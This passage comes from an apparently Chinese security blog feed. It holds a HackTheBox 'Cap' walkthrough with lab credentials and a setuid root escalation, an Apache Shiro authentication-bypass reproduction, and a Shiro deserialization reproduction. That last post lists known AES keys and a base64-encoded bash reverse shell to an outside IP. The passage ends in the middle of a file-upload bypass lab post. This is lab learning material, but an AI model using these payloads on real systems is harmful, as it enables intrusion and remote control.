</span><br><span class="line">|     HTTP/1.1 400 Bad Request</span><br><span class="line">|     Connection: close</span><br><span class="line">|     Content-Type: text/html</span><br><span class="line">|     Content-Length: 196</span><br><span class="line">|     &lt;html&gt;</span><br><span class="line">|     &lt;head&gt;</span><br><span class="line">|     &lt;title&gt;Bad Request&lt;/title&gt;</span><br><span class="line">|     &lt;/head&gt;</span><br><span class="line">|     &lt;body&gt;</span><br><span class="line">|     &lt;h1&gt;&lt;p&gt;Bad Request&lt;/p&gt;&lt;/h1&gt;</span><br><span class="line">|     Invalid HTTP Version &amp;#x27;Invalid HTTP Version: &amp;#x27;RTSP/1.0&amp;#x27;&amp;#x27;</span><br><span class="line">|     &lt;/body&gt;</span><br><span class="line">|_    &lt;/html&gt;</span><br><span class="line">|_http-server-header: gunicorn</span><br><span class="line">|_http-title: Security Dashboard</span><br><span class="line">1117/tcp filtered ardus-mtrns</span><br><span class="line">3371/tcp filtered satvid-datalnk</span><br><span class="line">5822/tcp filtered unknown</span><br><span class="line">5952/tcp filtered unknown</span><br><span class="line">8652/tcp filtered unknown</span><br><span class="line">1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :</span><br><span class="line">SF-Port80-TCP:V=7.91%I=7%D=7/14%Time=60EE6988%P=x86_64-pc-linux-gnu%r(GetR</span><br><span class="line">SF:equest,1059,&quot;HTTP/1\.0\x20200\x20OK\r\nServer:\x20gunicorn\r\nDate:\x20</span><br><span class="line">SF:Wed,\x2014\x20Jul\x202021\x2004:39:13\x20GMT\r\nConnection:\x20close\r\</span><br><span class="line">SF:nContent-Type:\x20text/html;\x20charset=utf-8\r\nContent-Length:\x20193</span><br><span class="line">SF:86\r\n\r\n&lt;!DOCTYPE\x20html&gt;\n&lt;html\x20class=\&quot;no-js\&quot;\x20lang=\&quot;en\&quot;&gt;\</span><br><span class="line">SF:n\n&lt;head&gt;\n\x20\x20\x20\x20&lt;meta\x20charset=\&quot;utf-8\&quot;&gt;\n\x20\x20\x20\x2</span><br><span class="line">SF:0&lt;meta\x20http-equiv=\&quot;x-ua-compatible\&quot;\x20content=\&quot;ie=edge\&quot;&gt;\n\x20\</span><br><span class="line">SF:x20\x20\x20&lt;title&gt;Security\x20Dashboard&lt;/title&gt;\n\x20\x20\x20\x20&lt;meta\</span><br><span class="line">SF:x20name=\&quot;viewport\&quot;\x20content=\&quot;width=device-width,\x20initial-scale=</span><br><span class="line">SF:1\&quot;&gt;\n\x20\x20\x20\x20&lt;link\x20rel=\&quot;shortcut\x20icon\&quot;\x20type=\&quot;image</span><br><span class="line">SF:/png\&quot;\x20href=\&quot;/static/images/icon/favicon\.ico\&quot;&gt;\n\x20\x20\x20\x20&lt;</span><br><span class="line">SF:link\x20rel=\&quot;stylesheet\&quot;\x20href=\&quot;/static/css/bootstrap\.min\.css\&quot;&gt;</span><br><span class="line">SF:\n\x20\x20\x20\x20&lt;link\x20rel=\&quot;stylesheet\&quot;\x20href=\&quot;/static/css/fon</span><br><span class="line">SF:t-awesome\.min\.css\&quot;&gt;\n\x20\x20\x20\x20&lt;link\x20rel=\&quot;stylesheet\&quot;\x20</span><br><span class="line">SF:href=\&quot;/static/css/themify-icons\.css\&quot;&gt;\n\x20\x20\x20\x20&lt;link\x20rel=</span><br><span class="line">SF:\&quot;stylesheet\&quot;\x20href=\&quot;/static/css/metisMenu\.css\&quot;&gt;\n\x20\x20\x20\x2</span><br><span class="line">SF:0&lt;link\x20rel=\&quot;stylesheet\&quot;\x20href=\&quot;/static/css/owl\.carousel\.min\.</span><br><span class="line">SF:css\&quot;&gt;\n\x20\x20\x20\x20&lt;link\x20rel=\&quot;stylesheet\&quot;\x20href=\&quot;/static/c</span><br><span class="line">SF:ss/slicknav\.min\.css\&quot;&gt;\n\x20\x20\x20\x20&lt;!--\x20amchar&quot;)%r(HTTPOption</span><br><span class="line">SF:s,B3,&quot;HTTP/1\.0\x20200\x20OK\r\nServer:\x20gunicorn\r\nDate:\x20Wed,\x2</span><br><span class="line">SF:014\x20Jul\x202021\x2004:39:14\x20GMT\r\nConnection:\x20close\r\nConten</span><br><span class="line">SF:t-Type:\x20text/html;\x20charset=utf-8\r\nAllow:\x20GET,\x20HEAD,\x20OP</span><br><span class="line">SF:TIONS\r\nContent-Length:\x200\r\n\r\n&quot;)%r(RTSPRequest,121,&quot;HTTP/1\.1\x2</span><br><span class="line">SF:0400\x20Bad\x20Request\r\nConnection:\x20close\r\nContent-Type:\x20text</span><br><span class="line">SF:/html\r\nContent-Length:\x20196\r\n\r\n&lt;html&gt;\n\x20\x20&lt;head&gt;\n\x20\x20</span><br><span class="line">SF:\x20\x20&lt;title&gt;Bad\x20Request&lt;/title&gt;\n\x20\x20&lt;/head&gt;\n\x20\x20&lt;body&gt;\</span><br><span class="line">SF:n\x20\x20\x20\x20&lt;h1&gt;&lt;p&gt;Bad\x20Request&lt;/p&gt;&lt;/h1&gt;\n\x20\x20\x20\x20Invali</span><br><span class="line">SF:d\x20HTTP\x20Version\x20&amp;#x27;Invalid\x20HTTP\x20Version:\x20&amp;#x27;RTSP</span><br><span class="line">SF:/1\.0&amp;#x27;&amp;#x27;\n\x20\x20&lt;/body&gt;\n&lt;/html&gt;\n&quot;)%r(GenericLines,11E,&quot;HTT</span><br><span class="line">SF:P/1\.1\x20400\x20Bad\x20Request\r\nConnection:\x20close\r\nContent-Type</span><br><span class="line">SF::\x20text/html\r\nContent-Length:\x20193\r\n\r\n&lt;html&gt;\n\x20\x20&lt;head&gt;\</span><br><span class="line">SF:n\x20\x20\x20\x20&lt;title&gt;Bad\x20Request&lt;/title&gt;\n\x20\x20&lt;/head&gt;\n\x20\x</span><br><span class="line">SF:20&lt;body&gt;\n\x20\x20\x20\x20&lt;h1&gt;&lt;p&gt;Bad\x20Request&lt;/p&gt;&lt;/h1&gt;\n\x20\x20\x20\</span><br><span class="line">SF:x20Invalid\x20Request\x20Line\x20&amp;#x27;Invalid\x20HTTP\x20request\x20li</span><br><span class="line">SF:ne:\x20&amp;#x27;&amp;#x27;&amp;#x27;\n\x20\x20&lt;/body&gt;\n&lt;/html&gt;\n&quot;);</span><br><span class="line">Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 221.16 seconds</span><br></pre></td></tr></table></figure><h2 id="0x02-FTP匿名访问"><a href="#0x02-FTP匿名访问" class="headerlink" title="0x02.FTP匿名访问"></a>0x02.FTP匿名访问</h2><p><code>由于开放了21端口，所以尝试匿名登入，可以看到不允许匿名登入</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">┌──(root💀kali)-[~/htb/cap]</span><br><span class="line">└─# ftp anonymous@10.10.10.245                                                                                                                             1 ⚙</span><br><span class="line">ftp: anonymous@10.10.10.245: Name or service not known</span><br><span class="line"><span class="meta">ftp&gt;</span></span><br></pre></td></tr></table></figure><h2 id="0x03-访问80端口"><a href="#0x03-访问80端口" class="headerlink" title="0x03.访问80端口"></a>0x03.访问80端口</h2><p><code>手动爬虫发现这是一个网络设备管理面板</code></p><img src="/2021/07/14/HTB-cap/image-20210714131548126.png" class><p><code>多次点击发现url也会发生变化，且可以下载数据包</code></p><img src="/2021/07/14/HTB-cap/image-20210714131753971.png" class><img src="/2021/07/14/HTB-cap/image-20210714131753971.png" class><p><code>扫描data目录，访问发现一共有6个有效链接，分别是0、1、2、3、4、5，全部下载</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">──(root💀kali)-[~/htb/cap]</span><br><span class="line">└─# dirb http://10.10.10.245/data/                                                                                                                         1 ⚙</span><br><span class="line">-----------------</span><br><span class="line">DIRB v2.22    </span><br><span class="line">By The Dark Raver</span><br><span class="line">-----------------</span><br><span class="line">START_TIME: Wed Jul 14 01:10:25 2021</span><br><span class="line">URL_BASE: http://10.10.10.245/data/</span><br><span class="line">WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt</span><br><span class="line">-----------------</span><br><span class="line">GENERATED WORDS: 4612                                                          </span><br><span class="line">---- Scanning URL: http://10.10.10.245/data/ ----</span><br><span class="line">+ http://10.10.10.245/data/0 (CODE:200|SIZE:17147)</span><br><span class="line">+ http://10.10.10.245/data/00 (CODE:200|SIZE:17147) </span><br><span class="line">+ http://10.10.10.245/data/01 (CODE:200|SIZE:17144) </span><br><span class="line">+ http://10.10.10.245/data/02 (CODE:200|SIZE:17144)</span><br><span class="line">+ http://10.10.10.245/data/03 (CODE:200|SIZE:17144)                                                   </span><br><span class="line">+ http://10.10.10.245/data/04 (CODE:200|SIZE:17144)                                                     </span><br><span class="line">+ http://10.10.10.245/data/05 (CODE:200|SIZE:17147)                                                   </span><br><span class="line">+ http://10.10.10.245/data/1 (CODE:200|SIZE:17144)                                                      </span><br><span class="line">+ http://10.10.10.245/data/2 (CODE:200|SIZE:17144)                                                       </span><br><span class="line">+ http://10.10.10.245/data/3 (CODE:200|SIZE:17144)                                                       </span><br><span class="line">+ http://10.10.10.245/data/4 (CODE:200|SIZE:17144)                                                       + http://10.10.10.245/data/5 (CODE:200|SIZE:17147)</span><br></pre></td></tr></table></figure><img src="/2021/07/14/HTB-cap/image-20210714132457089.png" class><h2 id="0x04-数据包分析"><a href="#0x04-数据包分析" class="headerlink" title="0x04.数据包分析"></a>0x04.数据包分析</h2><p><code>6个数据包中只有0.pcap包含有用信息，得到用户与密码</code></p><blockquote><p>user:nathan</p><p>pass:Buck3tH4TF0RM3!</p></blockquote><img src="/2021/07/14/HTB-cap/image-20210714140327176.png" class><p><code>登入得到flag</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">┌──(root💀kali)-[~]</span><br><span class="line">└─# ssh nathan@10.10.10.245                                                                                                                                1 ⚙</span><br><span class="line">nathan@10.10.10.245&#x27;s password: </span><br><span class="line">Welcome to Ubuntu 20.04.2 LTS (GNU/Linux 5.4.0-73-generic x86_64)</span><br><span class="line"></span><br><span class="line"> * Documentation:  https://help.ubuntu.com</span><br><span class="line"> * Management:     https://landscape.canonical.com</span><br><span class="line"> * Support:        https://ubuntu.com/advantage</span><br><span class="line"></span><br><span class="line">  System information as of Wed Jul 14 06:11:21 UTC 2021</span><br><span class="line"></span><br><span class="line">  System load:           0.04</span><br><span class="line">  Usage of /:            35.0% of 8.73GB</span><br><span class="line">  Memory usage:          21%</span><br><span class="line">  Swap usage:            0%</span><br><span class="line">  Processes:             228</span><br><span class="line">  Users logged in:       0</span><br><span class="line">  IPv4 address for eth0: 10.10.10.245</span><br><span class="line">  IPv6 address for eth0: dead:beef::250:56ff:feb9:dda9</span><br><span class="line"></span><br><span class="line">  =&gt; There are 4 zombie processes.</span><br><span class="line"></span><br><span class="line"> * Super-optimized for small spaces - read how we shrank the memory</span><br><span class="line">   footprint of MicroK8s to make it the smallest full K8s around.</span><br><span class="line"></span><br><span class="line">   https://ubuntu.com/blog/microk8s-memory-optimisation</span><br><span class="line"></span><br><span class="line">The list of available updates is more than a week old.</span><br><span class="line">To check for new updates run: sudo apt update</span><br><span class="line">Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings</span><br><span class="line"></span><br><span class="line">nathan@cap:~$ ls</span><br><span class="line">user.txt</span><br><span class="line">nathan@cap:~$ cat user.txt </span><br><span class="line">*************************</span><br><span class="line">nathan@cap:~$</span><br></pre></td></tr></table></figure><h2 id="0x05-提权"><a href="#0x05-提权" class="headerlink" title="0x05.提权"></a>0x05.提权</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">nathan@cap:~$ python3 -c &#x27;import os; os.setuid(0); os.system(&quot;/bin/sh&quot;)&#x27;</span><br><span class="line"><span class="meta">#</span><span class="bash"> /bin/bash</span></span><br><span class="line">root@cap:~# cd /root</span><br><span class="line">root@cap:/root# ls</span><br><span class="line">root.txt  snap</span><br><span class="line">root@cap:/root# cat root.txt </span><br><span class="line">****************************</span><br><span class="line">root@cap:/root# </span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;0x00-简述&quot;&gt;&lt;a href=&quot;#0x00-简述&quot; class=&quot;headerlink&quot; title=&quot;0x00.简述&quot;&gt;&lt;/a&gt;0x00.简述&lt;/h2&gt;&lt;img src=&quot;/2021/07/14/HTB-cap/image-20210714122750156.png&quot; class&gt;</summary>
    
    
    
    <category term="HackTheBox" scheme="https://lunamoore.github.io/categories/HackTheBox/"/>
    
    
    <category term="靶机" scheme="https://lunamoore.github.io/tags/%E9%9D%B6%E6%9C%BA/"/>
    
  </entry>
  
  <entry>
    <title>CVE-2020-1957</title>
    <link href="https://lunamoore.github.io/2021/06/06/CVE-2020-1957/"/>
    <id>https://lunamoore.github.io/2021/06/06/CVE-2020-1957/</id>
    <published>2021-06-06T13:20:02.000Z</published>
    <updated>2021-06-06T13:39:25.577Z</updated>
    
    <content type="html"><![CDATA[<h2 id="（CVE-2020-1957）Apache-Shiro-身份认证绕过漏洞"><a href="#（CVE-2020-1957）Apache-Shiro-身份认证绕过漏洞" class="headerlink" title="（CVE-2020-1957）Apache Shiro 身份认证绕过漏洞"></a>（CVE-2020-1957）Apache Shiro 身份认证绕过漏洞</h2><hr><h2 id="0x01-漏洞简述"><a href="#0x01-漏洞简述" class="headerlink" title="0x01.漏洞简述"></a>0x01.漏洞简述</h2><p>Apache Shiro 1.5.2之前版本中存在安全漏洞。攻击者可借助特制的请求利用该漏洞绕过身份验证。</p><a id="more"></a><h2 id="0x02-影响版本"><a href="#0x02-影响版本" class="headerlink" title="0x02.影响版本"></a>0x02.影响版本</h2><p>Apache Shiro &lt; v1.5.2</p><h2 id="0x03-漏洞分析"><a href="#0x03-漏洞分析" class="headerlink" title="0x03.漏洞分析"></a>0x03.漏洞分析</h2><p><span class="exturl" data-url="aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzMzgwNTQ5L2FydGljbGUvZGV0YWlscy8xMDcwMzE3NDY/b3BzX3JlcXVlc3RfbWlzYz0lMjU3QiUyNTIycmVxdWVzdCUyNTVGaWQlMjUyMiUyNTNBJTI1MjIxNjIyOTg1OTkzMTY3ODAyNTUyNzgxNDclMjUyMiUyNTJDJTI1MjJzY20lMjUyMiUyNTNBJTI1MjIyMDE0MDcxMy4xMzAxMDIzMzQucGMlMjU1RmJsb2cuJTI1MjIlMjU3RCZyZXF1ZXN0X2lkPTE2MjI5ODU5OTMxNjc4MDI1NTI3ODE0NyZiaXpfaWQ9MCZ1dG1fbWVkaXVtPWRpc3RyaWJ1dGUucGNfc2VhcmNoX3Jlc3VsdC5ub25lLXRhc2stYmxvZy0yfmJsb2d+Zmlyc3RfcmFua192Mn5yYW5rX3YyOS0zLTEwNzAzMTc0Ni5ub25lY2FzZSZ1dG1fdGVybT1DVkUtMjAyMC0xOTU3JnNwbT0xMDE4LjIyMjYuMzAwMS40NDUw">轮子轮子<i class="fa fa-external-link-alt"></i></span></p><h2 id="0x03-漏洞复现"><a href="#0x03-漏洞复现" class="headerlink" title="0x03.漏洞复现"></a>0x03.漏洞复现</h2><p><strong>环境搭建</strong></p><p><span class="exturl" data-url="aHR0cHM6Ly92dWxodWIub3JnLw==">vulhub<i class="fa fa-external-link-alt"></i></span></p><p>admin认证绕过</p><p>直接访问/admin，跳转到登入页面</p><img src="/2021/06/06/CVE-2020-1957/CVE-2020-1957_08.png" class><p>绕过：/demo/..;/admin/  或   /demo;/../admin/</p><img src="/2021/06/06/CVE-2020-1957/CVE-2020-1957_09.png" class><img src="/2021/06/06/CVE-2020-1957/CVE-2020-1957_10.png" class>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;（CVE-2020-1957）Apache-Shiro-身份认证绕过漏洞&quot;&gt;&lt;a href=&quot;#（CVE-2020-1957）Apache-Shiro-身份认证绕过漏洞&quot; class=&quot;headerlink&quot; title=&quot;（CVE-2020-1957）Apache Shiro 身份认证绕过漏洞&quot;&gt;&lt;/a&gt;（CVE-2020-1957）Apache Shiro 身份认证绕过漏洞&lt;/h2&gt;&lt;hr&gt;
&lt;h2 id=&quot;0x01-漏洞简述&quot;&gt;&lt;a href=&quot;#0x01-漏洞简述&quot; class=&quot;headerlink&quot; title=&quot;0x01.漏洞简述&quot;&gt;&lt;/a&gt;0x01.漏洞简述&lt;/h2&gt;&lt;p&gt;Apache Shiro 1.5.2之前版本中存在安全漏洞。攻击者可借助特制的请求利用该漏洞绕过身份验证。&lt;/p&gt;</summary>
    
    
    
    <category term="漏洞复现" scheme="https://lunamoore.github.io/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    
    <category term="CVE" scheme="https://lunamoore.github.io/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/CVE/"/>
    
    <category term="Shiro" scheme="https://lunamoore.github.io/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/CVE/Shiro/"/>
    
    
    <category term="CVE" scheme="https://lunamoore.github.io/tags/CVE/"/>
    
    <category term="调教" scheme="https://lunamoore.github.io/tags/%E8%B0%83%E6%95%99/"/>
    
    <category term="Shiro" scheme="https://lunamoore.github.io/tags/Shiro/"/>
    
  </entry>
  
  <entry>
    <title>CVE-2016-4437复现</title>
    <link href="https://lunamoore.github.io/2021/06/06/CVE-2016-4437/"/>
    <id>https://lunamoore.github.io/2021/06/06/CVE-2016-4437/</id>
    <published>2021-06-06T12:54:08.000Z</published>
    <updated>2021-06-06T13:11:13.192Z</updated>
    
    <content type="html"><![CDATA[<h2 id="（CVE-2016-4437）Apache-Shiro-反序列化漏洞"><a href="#（CVE-2016-4437）Apache-Shiro-反序列化漏洞" class="headerlink" title="（CVE-2016-4437）Apache Shiro 反序列化漏洞"></a>（CVE-2016-4437）Apache Shiro 反序列化漏洞</h2><hr><h2 id="0x01-漏洞简述"><a href="#0x01-漏洞简述" class="headerlink" title="0x01.漏洞简述"></a>0x01.漏洞简述</h2><p>Apache shiro默认使用了<code>CookieRememberMeManager</code>，其处理cookie的流程是：得到<code>rememberMe的cookie值</code>–&gt;<code>Base64解码</code>–&gt;<code>AES解密</code>–&gt;<code>反序列化</code>。<br>然而AES的密钥是硬编码的，就导致了攻击者可以构造恶意数据造成反序列化的RCE漏洞。</p><a id="more"></a><h2 id="0x02-影响版本"><a href="#0x02-影响版本" class="headerlink" title="0x02.影响版本"></a>0x02.影响版本</h2><p>Apache Shiro &lt;= v1.2.4</p><h2 id="0x03-漏洞分析"><a href="#0x03-漏洞分析" class="headerlink" title="0x03.漏洞分析"></a>0x03.漏洞分析</h2><p><span class="exturl" data-url="aHR0cHM6Ly9zYXVjZXItbWFuLmNvbS9pbmZvcm1hdGlvbl9zZWN1cml0eS8zOTYuaHRtbA==">不造轮子了。。。<i class="fa fa-external-link-alt"></i></span></p><h2 id="0x04-漏洞复现"><a href="#0x04-漏洞复现" class="headerlink" title="0x04.漏洞复现"></a>0x04.漏洞复现</h2><p> 网络上收集到的key</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">kPH+bIxk5D2deZiIxcaaaA&#x3D;&#x3D;</span><br><span class="line">3qDVdLawoIr1xFd6ietnwg&#x3D;&#x3D;</span><br><span class="line">YI1+nBV&#x2F;&#x2F;m7ELrIyDHm6DQ&#x3D;&#x3D;</span><br><span class="line">6Zm+6I2j5Y+R5aS+5ZOlAA&#x3D;&#x3D;</span><br><span class="line">2A2V+RFLUs+eTA3Kpr+dag&#x3D;&#x3D;</span><br><span class="line">6ZmI6I2j3Y+R1aSn5BOlAA&#x3D;&#x3D;</span><br><span class="line">SkZpbmFsQmxhZGUAAAAAAA&#x3D;&#x3D;</span><br><span class="line">2cVtiE83c4lIrELJwKGJUw&#x3D;&#x3D;</span><br><span class="line">fsHspZw&#x2F;92PrS3XrPW+vxw&#x3D;&#x3D;</span><br><span class="line">XTx6CKLo&#x2F;SdSgub+OPHSrw&#x3D;&#x3D;</span><br><span class="line">sHdIjUN6tzhl8xZMG3ULCQ&#x3D;&#x3D;</span><br><span class="line">O4pdf+7e+mZe8NyxMTPJmQ&#x3D;&#x3D;</span><br><span class="line">HWrBltGvEZc14h9VpMvZWw&#x3D;&#x3D;</span><br><span class="line">rPNqM6uKFCyaL10AK51UkQ&#x3D;&#x3D;</span><br><span class="line">Y1JxNSPXVwMkyvES&#x2F;kJGeQ&#x3D;&#x3D;</span><br><span class="line">lT2UvDUmQwewm6mMoiw4Ig&#x3D;&#x3D;</span><br><span class="line">MPdCMZ9urzEA50JDlDYYDg&#x3D;&#x3D;</span><br><span class="line">xVmmoltfpb8tTceuT5R7Bw&#x3D;&#x3D;</span><br><span class="line">c+3hFGPjbgzGdrC+MHgoRQ&#x3D;&#x3D;</span><br><span class="line">ClLk69oNcA3m+s0jIMIkpg&#x3D;&#x3D;</span><br><span class="line">Bf7MfkNR0axGGptozrebag&#x3D;&#x3D;</span><br><span class="line">1tC&#x2F;xrDYs8ey+sa3emtiYw&#x3D;&#x3D;</span><br><span class="line">ZmFsYWRvLnh5ei5zaGlybw&#x3D;&#x3D;</span><br><span class="line">cGhyYWNrY3RmREUhfiMkZA&#x3D;&#x3D;</span><br><span class="line">IduElDUpDDXE677ZkhhKnQ&#x3D;&#x3D;</span><br><span class="line">yeAAo1E8BOeAYfBlm4NG9Q&#x3D;&#x3D;</span><br><span class="line">2itfW92XazYRi5ltW0M2yA&#x3D;&#x3D;</span><br><span class="line">XgGkgqGqYrix9lI6vxcrRw&#x3D;&#x3D;</span><br><span class="line">ertVhmFLUs0KTA3Kprsdag&#x3D;&#x3D;</span><br><span class="line">5AvVhmFLUS0ATA4Kprsdag&#x3D;&#x3D;</span><br><span class="line">s0KTA3mFLUprK4AvVhsdag&#x3D;&#x3D;</span><br><span class="line">hBlzKg78ajaZuTE0VLzDDg&#x3D;&#x3D;</span><br><span class="line">9FvVhtFLUs0KnA3Kprsdyg&#x3D;&#x3D;</span><br><span class="line">d2ViUmVtZW1iZXJNZUtleQ&#x3D;&#x3D;</span><br><span class="line">yNeUgSzL&#x2F;CfiWw1GALg6Ag&#x3D;&#x3D;</span><br><span class="line">NGk&#x2F;3cQ6F5&#x2F;UNPRh8LpMIg&#x3D;&#x3D;</span><br><span class="line">4BvVhmFLUs0KTA3Kprsdag&#x3D;&#x3D;</span><br><span class="line">MzVeSkYyWTI2OFVLZjRzZg&#x3D;&#x3D;</span><br></pre></td></tr></table></figure><p><strong>poc</strong></p><p>使用shiro_tool.jar反弹shell</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -jar shiro_tool.jar http:<span class="comment">//your_ip:8080</span></span><br></pre></td></tr></table></figure><img src="/2021/06/06/CVE-2016-4437/CVE-2016-4437_01.png" class><p>使用1和10都可以，反弹shell需要编码</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -c &#123;<span class="built_in">echo</span>,YmFzaCAtaSA+JiAvZGV2L3RjcC84MS43MC4xOTUuMTU5LzY2NjYgMD4mMQ==&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;</span><br></pre></td></tr></table></figure><p>nc监听反弹shell</p><img src="/2021/06/06/CVE-2016-4437/CVE-2016-4437_02.png" class><p>抓包分析，看到http请求头Cookie字段为 rememberMe=**，响应头存在Set-Cookie:rememberMe=deleteMe</p><img src="/2021/06/06/CVE-2016-4437/CVE-2016-4437_03.png" class><h2 id="0x05-官方修复"><a href="#0x05-官方修复" class="headerlink" title="0x05.官方修复"></a>0x05.官方修复</h2><ul><li>删除代码里的默认密钥</li><li>默认配置里注释了默认密钥</li><li>如果不配置密钥，每次会重新随机一个密钥</li></ul>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;（CVE-2016-4437）Apache-Shiro-反序列化漏洞&quot;&gt;&lt;a href=&quot;#（CVE-2016-4437）Apache-Shiro-反序列化漏洞&quot; class=&quot;headerlink&quot; title=&quot;（CVE-2016-4437）Apache Shiro 反序列化漏洞&quot;&gt;&lt;/a&gt;（CVE-2016-4437）Apache Shiro 反序列化漏洞&lt;/h2&gt;&lt;hr&gt;
&lt;h2 id=&quot;0x01-漏洞简述&quot;&gt;&lt;a href=&quot;#0x01-漏洞简述&quot; class=&quot;headerlink&quot; title=&quot;0x01.漏洞简述&quot;&gt;&lt;/a&gt;0x01.漏洞简述&lt;/h2&gt;&lt;p&gt;Apache shiro默认使用了&lt;code&gt;CookieRememberMeManager&lt;/code&gt;，其处理cookie的流程是：得到&lt;code&gt;rememberMe的cookie值&lt;/code&gt;–&amp;gt;&lt;code&gt;Base64解码&lt;/code&gt;–&amp;gt;&lt;code&gt;AES解密&lt;/code&gt;–&amp;gt;&lt;code&gt;反序列化&lt;/code&gt;。&lt;br&gt;然而AES的密钥是硬编码的，就导致了攻击者可以构造恶意数据造成反序列化的RCE漏洞。&lt;/p&gt;</summary>
    
    
    
    <category term="漏洞复现" scheme="https://lunamoore.github.io/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    
    <category term="CVE" scheme="https://lunamoore.github.io/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/CVE/"/>
    
    <category term="Shiro" scheme="https://lunamoore.github.io/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/CVE/Shiro/"/>
    
    
    <category term="CVE" scheme="https://lunamoore.github.io/tags/CVE/"/>
    
    <category term="调教" scheme="https://lunamoore.github.io/tags/%E8%B0%83%E6%95%99/"/>
    
    <category term="Shiro" scheme="https://lunamoore.github.io/tags/Shiro/"/>
    
  </entry>
  
  <entry>
    <title>upload_labs</title>
    <link href="https://lunamoore.github.io/2021/05/03/upload-labs/"/>
    <id>https://lunamoore.github.io/2021/05/03/upload-labs/</id>
    <published>2021-05-03T11:21:45.000Z</published>
    <updated>2021-05-03T11:40:24.986Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Pass01-基于前端js验证"><a href="#Pass01-基于前端js验证" class="headerlink" title="Pass01.基于前端js验证"></a>Pass01.基于前端js验证</h2><p><code>上传图片抓包改后缀</code></p><h2 id="Pass02-检测MIME类型"><a href="#Pass02-检测MIME类型" class="headerlink" title="Pass02.检测MIME类型"></a>Pass02.检测MIME类型</h2><p><code>修改MIME为image/jpeg</code></p><a id="more"></a><h2 id="Pass03-黑名单-文件后缀绕过"><a href="#Pass03-黑名单-文件后缀绕过" class="headerlink" title="Pass03.黑名单 文件后缀绕过"></a>Pass03.黑名单 文件后缀绕过</h2><p><code>首先修改apache2配置文件</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">vim /etc/apache2/mods-available/mime.conf</span><br><span class="line">找到AddType application，增加一行，重启服务</span><br><span class="line">AddType application/x-httpd-php .php .phtml .phps .php5 .pht .php3</span><br></pre></td></tr></table></figure><p><code>上传.php5文件</code></p><img src="/2021/05/03/upload-labs/image-20210501125955299.png" 